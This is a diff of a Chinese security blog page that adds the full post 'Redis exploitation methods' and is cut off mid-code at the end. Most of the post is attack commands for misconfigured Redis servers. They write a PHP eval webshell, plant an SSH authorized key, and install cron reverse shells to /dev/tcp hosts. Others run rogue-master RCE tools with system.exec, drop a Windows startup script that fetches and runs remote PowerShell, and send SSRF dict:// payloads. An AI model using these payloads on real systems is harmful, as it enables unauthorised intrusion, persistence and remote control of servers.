@@ -6,15 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>u’Blogs</title>
+  <title>Redis利用方法整理 | u’Blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="u’blogs 网络安全|WEB安全|渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="u’Blogs">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="GetShell写webshell 已知web的绝对路径  对应目录具有读写权限">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis利用方法整理">
+<meta property="og:url" content="http://example.com/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/index.html">
 <meta property="og:site_name" content="u’Blogs">
-<meta property="og:description" content="u’blogs 网络安全|WEB安全|渗透测试">
+<meta property="og:description" content="GetShell写webshell 已知web的绝对路径  对应目录具有读写权限">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-24T14:36:55.468Z">
+<meta property="article:modified_time" content="2023-05-24T14:37:35.746Z">
 <meta property="article:author" content="uuuuuu">
 <meta property="article:tag" content="u’blogs 网络安全|WEB安全|渗透测试">
 <meta name="twitter:card" content="summary">
@@ -183,98 +185,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Windows提权笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Redis利用方法整理" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/">Windows提权笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2024-04-28T15:13:31.162Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Windows提权笔记"><a href="#Windows提权笔记" class="headerlink" title="Windows提权笔记"></a>Windows提权笔记</h1><ul>
-<li>最近在搞老外的站，好多古老的站，还是这些姿势好解决。</li>
-</ul>
-<p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</p>
-<p>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p>
-<p>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。</p>
-        
-          <a class="article-more-a" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Redis利用方法整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Redis利用方法整理</a>
+    <h1 class="article-title" itemprop="name">
+      Redis利用方法整理
     </h1>
   
 
@@ -293,594 +211,125 @@
 <li><p>对应目录具有读写权限</p>
 </li>
 </ul>
-        
-          <a class="article-more-a" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<span id="more"></span> 
 
 
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.154</span><br><span class="line">config set dir /var/www/html </span><br><span class="line">set xxx &quot;\n\n\n&lt;?php@eval($_POST[&#x27;c&#x27;]);?&gt;\n\n\n&quot; </span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 
 
-
-  
-    <article id="post-MySQL利用方法整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">MySQL利用方法整理</a>
-    </h1>
-  
-
-        
-        <a href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="archive-article-date">
-  	<time datetime="2023-05-24T14:35:24.037Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><ul>
-<li>知道网站物理路径</li>
-<li>高权限数据库用户(root)</li>
-<li>secure_file_priv 无限制</li>
-<li>网站路径有写入权限</li>
+<h3 id="写入ssh公钥getshell"><a href="#写入ssh公钥getshell" class="headerlink" title="写入ssh公钥getshell"></a>写入ssh公钥getshell</h3><ul>
+<li>redis服务为root权限</li>
+<li>允许密钥登录</li>
+<li>linux</li>
 </ul>
-        
-          <a class="article-more-a" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set xxssh &quot;\n\nssh-rsa xxxxxx\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 
 
+<h3 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h3><ul>
+<li>redis服务为root权限启动</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp;/dev/tcp/ip/端口 0&gt;&amp;1\n\n\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
-  
-    <article id="post-Fastjson漏洞总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">命令执行漏洞总结</a>
-    </h1>
-  
 
-        
-        <a href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2023-02-24T16:22:24.362Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Fastjson漏洞利用"><a href="#Fastjson漏洞利用" class="headerlink" title="Fastjson漏洞利用"></a>Fastjson漏洞利用</h1><h2 id="框架确认"><a href="#框架确认" class="headerlink" title="框架确认"></a>框架确认</h2><p><code>&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</code></p>
-<p>存在漏洞版本：</p>
+
+<p>tips:<strong>crontab反弹debian,ubuntu都不行</strong>，因为他们对计划任务的格式很严格，必须要执行 <code>crontab -u root /var/spool/cron/crontabs/root</code> 通过语法检查后，才能执行计划任务。    </p>
+<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
 <ul>
-<li>1.2.24</li>
-<li>1.2.45</li>
-<li>1.2.46</li>
-<li>1.2.47</li>
-<li>1.2.48</li>
-<li>1.2.49</li>
-<li>1.2.50</li>
-<li>1.2.51</li>
-<li>1.2.52</li>
-<li>1.2.53</li>
-<li>1.2.54</li>
-<li>1.2.55</li>
-<li>1.2.56</li>
-<li>1.2.57</li>
-<li>1.2.58</li>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
 </ul>
-<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2>
-        
-          <a class="article-more-a" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-在IPA中重签名iOS应用程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">在IPA中重签名iOS应用程序</a>
-    </h1>
-  
-
-        
-        <a href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
-  	<time datetime="2023-01-30T11:44:10.069Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-01-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>当我们在对iOS应用程序执行黑盒安全测试时，我们一般只能从AppStore来访问和获取iOS应用程序。但是在大多数情况下，客户都会给我们提供一个IPA文件。在黑盒测试过程中，我们无法访问目标应用的源代码，因此通过Xcode将其部署到设备并进行测试，几乎是不可能的。但是有一种可行的解决方案，即使用我们手头上的配置文件来重新启动应用程序，并将其部署到我们的测试设备上。</p>
-</blockquote>
-<p>在这篇文章中，我们将演示如何重新对一个iOS应用程序签名，并生成一个IPA文件，然后将其部署到我们的测试设备上。</p>
-        
-          <a class="article-more-a" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/iosTest//" class="article-tag-list-link color3">iosTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Vcenter实战利用方式总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">Vcenter实战利用方式总结</a>
-    </h1>
-  
-
-        
-        <a href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2022-11-13T14:25:40.427Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Vcenter实战利用方式总结"><a href="#Vcenter实战利用方式总结" class="headerlink" title="Vcenter实战利用方式总结"></a>Vcenter实战利用方式总结</h1><p>原文：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1893">https://forum.butian.net/share/1893</a></p>
-<h1 id="0x01-指纹特征"><a href="#0x01-指纹特征" class="headerlink" title="0x01 指纹特征"></a>0x01 指纹特征</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="string">&quot;+ ID_VC_Welcome +&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45ce5cec25a6cb4322a561fe2c04136bae411055.png" alt="image.png"></p>
-<h1 id="0x02-查看Vcenter版本"><a href="#0x02-查看Vcenter版本" class="headerlink" title="0x02 查看Vcenter版本"></a>0x02 查看Vcenter版本</h1>
-        
-          <a class="article-more-a" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Elasticsearch基础（二）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/">Elasticsearch基础（二）</a>
-    </h1>
-  
-
-        
-        <a href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-11-10T13:49:47.499Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Elasticsearch基础（二）"><a href="#Elasticsearch基础（二）" class="headerlink" title="Elasticsearch基础（二）"></a>Elasticsearch基础（二）</h2><p>ES里的关键字段与mysql的对照关系： </p>
-<ul>
-<li>Index(索引)—-数据库database</li>
+<h3 id="主从rce"><a href="#主从rce" class="headerlink" title="主从rce"></a>主从rce</h3><ul>
+<li>redis服务为root权限启动</li>
+<li>redis 4.x/5.x</li>
 </ul>
-        
-          <a class="article-more-a" href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/#more">more >></a>
-        
-      
+<p>本质上就是加载一个so文件，用来执行命令。和udf差不多。如果本身就可以上传文件的情况下，直接上传so文件加载即可，不用利用主从。主从的意思就是把当前redis设置为备份库，等着把恶意的远程db备份过来，进行加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>开启恶意redis一键rce</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce</span><br><span class="line">python redis-rce.py -r 192.168.1.154 -L 192.168.1.153 -f module.so</span><br><span class="line">python redis-rce.py -r 10.10.30.171 -p 44711 -L 10.10.30.171 -L 12138 -f exp.so -v</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/redis-rogue-getshell</span><br><span class="line">需要python3.0以上</span><br><span class="line">编译</span><br><span class="line">&gt;cd RedisModulesSDK/</span><br><span class="line">&gt;make</span><br><span class="line">会在此目录下生成exp.so</span><br><span class="line">执行命令</span><br><span class="line">&gt;python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c &quot;cat /etc/passwd&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https://github.com/n0b0dyCN/redis-rogue-server.git</span><br><span class="line"></span><br><span class="line">python3 redis-rogue-server.py --rhost 10.10.30.171 --rport 8407 --lhost 10.10.30.171 --lport 1218 </span><br></pre></td></tr></table></figure>
+
+
+<h4 id="手动操作"><a href="#手动操作" class="headerlink" title="手动操作"></a>手动操作</h4><p>redis加载远程exp.so命令执行,配合被动连接使用   </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#设置redis的备份路径为当前目录(注意目录权限问题)</span><br><span class="line">    config set dir ./</span><br><span class="line">#设置备份文件名为exp.so，默认为dump.rdb</span><br><span class="line">    config set dbfilename exp.so</span><br><span class="line">#设置主服务器IP和端口</span><br><span class="line">    slaveof 192.168.172.129 21000  </span><br><span class="line">#加载恶意模块</span><br><span class="line">    module load ./exp.so</span><br><span class="line">#切断主从，关闭复制功能</span><br><span class="line">    slaveof no one </span><br><span class="line">#执行系统命令</span><br><span class="line">    system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>还可以写无损文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">https://github.com/r35tart/RedisWriteFile</a></p>
+<p>还可以主从复制覆写shadow</p>
+<h3 id="windows系统主从利用"><a href="#windows系统主从利用" class="headerlink" title="windows系统主从利用"></a>windows系统主从利用</h3><ul>
+<li>需要启动项目录的写入权限</li>
+<li>服务器需要重启</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">config set dbfilename shell.bat</span><br><span class="line">set x &quot;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://xxx.xxx.xxx.2/shell.ps1&#x27;);xx.ps1\&quot;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="win利用dll"><a href="#win利用dll" class="headerlink" title="win利用dll"></a>win利用dll</h2><p><a target="_blank" rel="noopener" href="https://github.com/learner-ing/redis-rce">https://github.com/learner-ing/redis-rce</a></p>
+<h2 id="win系统getshell"><a href="#win系统getshell" class="headerlink" title="win系统getshell"></a>win系统getshell</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7940">https://xz.aliyun.com/t/7940</a><br>总体来说目前Windows的Redis getshell还没有发现直来直去一招通杀的方式。当然这主要是由于Windows自身特性以及Redis不（出）更（新）新（洞）的缘故。<br>但就像没有Redis4.x-5.x主从RCE之前的Linux环境一样，碰到了Redis即使知道有一定可能没权限写入，但还是要把最基础的试它一试，最起码常见的用户名目录要尝试写一写，mof尝试写一写，万一就成了呢？<br>运气也是实力的一部分，什么都觉得不可能，什么都不做，那就什么都不会有。</p>
+<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><h2 id="ssrf-攻击未授权访问redis"><a href="#ssrf-攻击未授权访问redis" class="headerlink" title="ssrf 攻击未授权访问redis"></a>ssrf 攻击未授权访问redis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 清空 key</span><br><span class="line">dict://172.72.23.27:6379/flushall</span><br><span class="line"></span><br><span class="line"># 设置要操作的路径为定时任务目录</span><br><span class="line">dict://172.72.23.27:6379/config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line"># 在定时任务目录下创建 root 的定时任务文件</span><br><span class="line">dict://172.72.23.27:6379/config set dbfilename root</span><br><span class="line"></span><br><span class="line"># 写入 Bash 反弹 shell 的 payload</span><br><span class="line">dict://172.72.23.27:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/2333 0&gt;%261\n&quot;</span><br><span class="line"></span><br><span class="line"># 保存上述操作</span><br><span class="line">dict://172.72.23.27:6379/save</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果是Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。见ref  </p>
+<h2 id="ssrf-攻击需要验证redis"><a href="#ssrf-攻击需要验证redis" class="headerlink" title="ssrf 攻击需要验证redis"></a>ssrf 攻击需要验证redis</h2><p>可以看到每行都是以\r结尾的，但是 Redis 的协议是以 CRLF (\r\n)结尾，所以转换的时候需要把\r转换为\r\n，然后其他全部进行 两次 URL 编码</p>
+<p>可用socat来抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379</span><br></pre></td></tr></table></figure>
+
+<p>具体流量包如下(实时显示)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 